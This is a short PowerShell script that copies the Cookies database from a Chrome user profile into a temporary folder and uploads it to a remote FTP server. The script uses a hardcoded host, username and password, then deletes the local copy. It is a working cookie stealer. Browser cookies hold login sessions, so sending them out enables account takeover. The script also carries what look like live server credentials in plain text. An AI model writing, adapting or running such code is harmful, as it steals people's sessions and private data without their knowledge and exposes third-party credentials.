# FTP server details
$FTP_HOST = "us-east-1.sftpcloud.io"
$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'

# Directories to work with
$source_directory_1 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"
$source_directory_2 = "C:\Users\Muhammad\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies"

# FTP function to upload files, now directing files to /Cookies directory
function Upload-ToFtp {
    param (
        [String]$file_path,
        [String]$file_name
    )
    # Load Assembly and create FTPWebRequest to /Cookies directory
    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
    Add-Type -AssemblyName System.Net
    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.UseBinary = $true
    $ftpRequest.KeepAlive = $false

    # Read file content
    $content = Get-Content -Path $file_path -Encoding Byte -ReadCount 0
    $ftpRequest.ContentLength = $content.Length

    # Get request stream and upload the file
    $requestStream = $ftpRequest.GetRequestStream()
    $requestStream.Write($content, 0, $content.Length)
    $requestStream.Close()

    Write-Host "Uploaded $file_name to FTP in /Cookies."
}

# Check if the first file exists, then copy and upload
if (Test-Path $source_directory_1) {
    $file_name = [System.IO.Path]::GetFileName($source_directory_1)
    $temp_path = Join-Path -Path "C:\temp" -ChildPath $file_name
    Copy-Item -Path $source_directory_1 -Destination $temp_path # Copy the file to a temporary location
    Upload-ToFtp -file_path $temp_path -file_name $file_name # Upload the file from the temporary location to /Cookies
    Remove-Item -Path $temp_path # Clean up the temporary file
} else {
    Write-Host "The directory or file does not exist."
}

# Check for the second directory and ignore if it doesn't exist
if (Test-Path $source_directory_2) {
    Write-Host "Project2 directory exists." # Placeholder for actual actions
} else {
    Write-Host "Project2 folder does not exist, ignoring."
}
